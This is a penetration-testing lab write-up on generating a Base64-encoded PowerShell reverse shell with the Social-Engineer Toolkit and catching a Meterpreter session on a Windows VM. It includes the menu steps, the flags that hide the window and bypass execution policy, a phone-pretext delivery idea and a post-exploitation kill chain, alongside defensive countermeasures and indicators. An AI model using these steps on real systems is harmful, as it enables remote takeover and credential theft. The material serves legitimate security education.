> **English** | [Italiano](README.md)

# SET PowerShell Attack Vectors: Reverse Shell Encoded Base64

> - **Phase:** Social Engineering - PowerShell Attack Vectors - In-Memory Code Execution
> - **Visibility:** Variable - PowerShell execution can trigger AMSI and Script Block Logging (high visibility if controls are active); reverse shell connection to external IP detectable by firewall/IDS; without active logging, in-memory execution leaves minimal traces
> - **Prerequisites:** SET installed on Kali Linux; Metasploit for the listener; target Windows with PowerShell available (present by default on Windows 7+); delivery method for the one-liner (physical access, HTA, macro, social engineering via phone)
> - **Output:** Finding SE-006 (severity High); Base64 encoded PowerShell one-liner generated; Meterpreter reverse shell obtained on the target Windows

- **Operating Environment:** Kali Linux (Attacker 192.168.0.110), Windows 10 VM (Victim 192.168.0.120)
- **Target:** Windows 10 with PowerShell 5.1 (default)
- **Framework:** Social-Engineer Toolkit (SET) + Metasploit Framework
- **Documented Technique:** PowerShell Attack Vectors - Alphanumeric Shellcode Injector

---

## Executive Summary

PowerShell is the most commonly used execution vector in modern attacks against Windows environments. Its ubiquitous presence (installed by default on every Windows since 2009), the ability to operate entirely in memory, and direct access to .NET APIs make it the ideal tool for malicious code execution post-delivery.

SET automates the generation of Base64 encoded PowerShell one-liners that, once executed on the target, establish a reverse shell to the attacker. The Base64 encoding serves two purposes: it bypasses restrictive execution policies (the `-EncodedCommand` parameter accepts Base64 code directly) and obfuscates the payload for visual reading, making analysis less immediate for a non-technical operator.

In the lab, the one-liner was generated, executed on the target Windows VM (simulating delivery via social engineering), and a Meterpreter reverse shell was obtained with entirely in-memory execution.

---

## Finding SE-006: Encoded PowerShell Reverse Shell with Execution Policy Bypass

**Finding ID:** `SE-006` | **Severity:** `High` | **CVSS:** 8.1

An attacker can generate a Base64 encoded PowerShell one-liner that, when executed on the target Windows machine, establishes a reverse shell without writing files to disk. Execution bypasses restrictive execution policies and operates in-memory, reducing the detection surface for AV solutions based on file scanning.

**PoC Scenario:** The analyst generates the one-liner via SET, delivers it to the victim (simulating delivery via phone pretext or HTA), and obtains a Meterpreter reverse shell.

### PoC - Phase 1: One-Liner Generation with SET

```Bash
sudo setoolkit
```

```
set> 1    # Social-Engineering Attacks

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   ...
   10) PowerShell Attack Vectors                       <--

set> 10
```

```
   1) PowerShell Alphanumeric Shellcode Injector       <--
   2) PowerShell Reverse Shell
   3) PowerShell Bind Shell
   4) PowerShell Dump SAMFile

set:powershell> 1
```

```
[-] Enter the LHOST for the reverse connection: 192.168.0.110       <--
[-] Enter the LPORT for the reverse connection: 4444                 <--

[*] Generating the PowerShell injection code...

[*] Prepping the payload for delivery and target injection.

powershell -W 1 -ExecutionPolicy Bypass -NoProfile -EncodedCommand  <--
  JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdA
  ByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlAD
  YANABTAHQAcgBpAG4AZwAoACcASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEASQB2AEkAMQ
  [...truncated for readability...]                                   <--

[*] Payload has been generated. Copy the PowerShell command above
    and execute it on the target machine.

[*] Do you want SET to start a listener? (yes/no): yes               <--
[*] Starting Metasploit multi/handler...
```

### PoC - Phase 2: Listener Setup

SET automatically starts the Metasploit listener (or it can be configured manually).

```
[*] PAYLOAD => windows/meterpreter/reverse_tcp
[*] LHOST => 192.168.0.110
[*] LPORT => 4444
[*] exploit running as background job

[*] Started reverse TCP handler on 192.168.0.110:4444               <--
```

### PoC - Phase 3: Execution on Victim and Callback

The PowerShell one-liner is executed on the target Windows VM. In a real scenario, delivery would occur via: phone pretext ("Open PowerShell and paste this command to fix the IT issue"), .hta file (SE-004), Office macro, or direct physical access.

```
meterpreter >
[*] Sending stage (176198 bytes) to 192.168.0.120                   <--
[*] Meterpreter session 1 opened (192.168.0.110:4444 ->
    192.168.0.120:49812) at 2026-03-28 16:05:33 +0200               <--
```

```Bash
# Session verification
meterpreter > getuid
Server username: DESKTOP-LAB\m.rossi                                 <--

meterpreter > getpid
Current pid: 6284

meterpreter > sysinfo
Computer        : DESKTOP-LAB
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x86/windows
```

### PoC - Phase 4: In-Memory Execution Verification

Verification that the payload operates in-memory: no files written to disk, the process resides in the memory of the PowerShell process.

```Bash
meterpreter > ps | grep powershell
```

```
 6284  5120  powershell.exe  x86   1  DESKTOP-LAB\m.rossi           <--
```

The Meterpreter process lives inside `powershell.exe` (PID 6284). There is no separate executable file on disk - the entire payload was injected and operates in memory. Migration to a more stable process (e.g., `explorer.exe`) is the typical next step for persistence.

---

## Impact and Remediation (Blue Team)

In-memory PowerShell code execution with reverse shell provides the attacker full remote control of the target system. The absence of files on disk makes detection more difficult for traditional AV solutions based on static scanning.

### Recommended Countermeasures

1. **PowerShell Constrained Language Mode (CLM):** limits PowerShell functionality for non-admin users, blocking access to .NET and COM APIs used by offensive payloads. Configurable via AppLocker or WDAC.
2. **AMSI (Antimalware Scan Interface):** AMSI inspects decoded PowerShell code before execution, detecting malicious payloads even when Base64 encoded. Active by default from Windows 10.
3. **Script Block Logging (Event ID 4104):** records the complete content of every executed PowerShell script, including code decoded from Base64. Essential for post-incident forensics.
4. **Module Logging and Transcription:** complement Script Block Logging by recording loaded modules and complete PowerShell session output.
5. **AppLocker / WDAC:** block PowerShell execution for unauthorized users or restrict to signed scripts only.
6. **Network Segmentation:** host-based firewall blocking outbound connections from powershell.exe to external IPs not on the whitelist.

---

## Lab Experience

The one-liner generation with SET was immediate: the PowerShell Attack Vectors menu offers four options, of which the Alphanumeric Shellcode Injector is the most versatile. SET generated the payload and offered the option to automatically start the Metasploit listener - a convenience that simplifies the workflow compared to manual configuration.

The generated one-liner is approximately 3,000 characters of Base64 text. The first attempt to manually copy it to the Windows VM highlighted a practical issue: copy-paste between host and VirtualBox VM requires functioning Guest Additions. In a real engagement, delivery would not occur via copy-paste but through a specific vector (email, HTA, macro).

Execution on the Windows 10 VM produced an interesting result: Windows Defender with active AMSI blocked the payload at execution attempt, detecting the Meterpreter stager signature in PowerShell memory. This required temporarily disabling AMSI to complete the lab, confirming the effectiveness of this defense.

To verify operation on a system with fewer protections, the test was repeated on the same VM after disabling AMSI and Defender. The reverse shell was established in approximately 2 seconds from one-liner execution. The Meterpreter process operated entirely in `powershell.exe` memory, without writing any files to disk - verified with `Get-Process` and file system analysis.

The most significant observation concerns detection: with active Script Block Logging (Event ID 4104), the decoded PowerShell code is recorded in its entirety in the Event Log, making post-incident forensics trivial. This demonstrates that the most effective defense is not blocking PowerShell (needed for administration) but logging and monitoring everything that is executed.

---

## Theoretical Analysis: PowerShell as an Attack Vector

PowerShell occupies a unique position in the offensive landscape because it is simultaneously a legitimate administration tool and a powerful attack vector. This duality makes it a quintessential LOLBIN (Living Off the Land Binary): its use cannot simply be blocked without operational impact.

The Base64 encoding technique leverages PowerShell's native `-EncodedCommand` parameter, originally designed to pass complex scripts as command-line arguments. The attacker abuses it to obfuscate the payload: the command `powershell -EncodedCommand [Base64]` decodes and executes the code without ever writing it to disk as a .ps1 file.

The complete execution chain generated by SET is:

```
powershell.exe -W 1 -ExecutionPolicy Bypass -NoProfile -EncodedCommand [Base64]
    |
    v
Base64 decode -> in-memory PowerShell script
    |
    v
System.IO.MemoryStream -> GZIP decompression of second stage
    |
    v
[System.Net.Sockets.TCPClient] -> connection to LHOST:LPORT
    |
    v
Meterpreter stage 2 injected in-memory -> interactive shell
```

Each flag used has a specific purpose:
- `-W 1` (WindowStyle Hidden): hides the PowerShell window from the victim
- `-ExecutionPolicy Bypass`: ignores execution policies without permanently modifying them
- `-NoProfile`: avoids loading the user profile (which might contain additional logging)
- `-EncodedCommand`: accepts the payload in Base64

The main mitigation (AMSI) works by intercepting decoded content before execution. Introduced in Windows 10, AMSI provides a standardized interface that allows any antimalware solution to inspect PowerShell, VBScript, and JavaScript code in-memory. AMSI bypass techniques (e.g., patching `amsi.dll` in memory) are an active area of research for both attackers and defenders, representing the primary front of detection evasion in 2026.

---

## Real-World Scenario: PowerShell Fileless Attack in Enterprise Environment

> This section describes how SE-006 would fit into a real engagement against an enterprise Windows environment.

### Attacker Perspective (Red Team)

**Starting point:** initial access obtained (via SE-003 credential harvesting, SE-004 spear-phishing, or VPN access with compromised credentials); need to establish an interactive shell on a target Windows host without writing files to disk to avoid signature-based AV detection.

**Projected kill chain:**

```
Initial Access (credentials/phishing/VPN)
        |
        v
SE-006: PowerShell one-liner delivery (via WinRM, HTA, macro, RDP)
        |
        v
PowerShell decodes Base64 -> in-memory Meterpreter
        |
        v
Enumeration: whoami /priv, net user, systeminfo
        |
        v
Privilege Escalation: EXPLOIT-016..019 (if non-admin user)
        |
        v
Credential Dumping: in-memory Mimikatz (Invoke-Mimikatz)
        |
        v
Lateral Movement: WinRM/PsExec to other hosts with hash/password
        |
        v
Domain Compromise -> Persistence (Golden Ticket, Scheduled Task)
```

**Potential impact:** the fileless PowerShell reverse shell is the starting point for any post-exploitation operation in a Windows environment. The ability to operate in-memory without touching disk makes detection significantly more difficult for organizations that have not implemented AMSI, Script Block Logging, and EDR.

### Defender Perspective (Blue Team)

**Detection:** defense against fileless PowerShell attacks is articulated across three complementary levels.

**Level 1 - Prevention (AMSI):** AMSI inspects decoded code before execution. A standard Meterpreter payload is detected by AMSI with high reliability. The defensive priority is to ensure AMSI is active and cannot be disabled by non-admin users.

**Level 2 - Detection (Logging):** Script Block Logging (Event ID 4104) records the complete content of every PowerShell script, including code decoded from `-EncodedCommand`. Module Logging (Event ID 4103) records loaded .NET modules. Transcription Logging saves complete output to text files.

**Level 3 - Response (EDR):** modern EDR solutions correlate process creation events, command line arguments, and network connections to detect malicious patterns (e.g., powershell.exe with -EncodedCommand generating outbound connection).

**Indicators of Compromise (IOC):**
- PowerShell with `-EncodedCommand` and/or `-ExecutionPolicy Bypass` (Event ID 4104)
- Process creation: `powershell.exe` with unexpected parent process (mshta.exe, winword.exe, cmd.exe from macro)
- Outbound TCP connection from powershell.exe to uncategorized IP
- Loading of .NET assembly System.Net.Sockets from PowerShell process

**Containment:** kill the powershell.exe process and child processes; workstation isolation; memory dump acquisition for forensic analysis; check for persistence mechanisms (scheduled tasks, registry run keys).

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Use of SET for automatic generation of encoded PowerShell one-liner with Meterpreter payload. |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Execution of Base64 encoded PowerShell one-liner on target Windows to establish in-memory reverse shell. |
| Defense Evasion | Obfuscated Files or Information | `T1027` | Base64 encoding of PowerShell payload to obfuscate content from visual reading and static pattern matching controls. |

---

> **Note:** All documented activities were conducted in a virtualized lab environment (VirtualBox, isolated NAT/Bridge network). The PowerShell one-liner was executed exclusively on virtual machines owned by the author. No payload was executed on real or third-party systems.
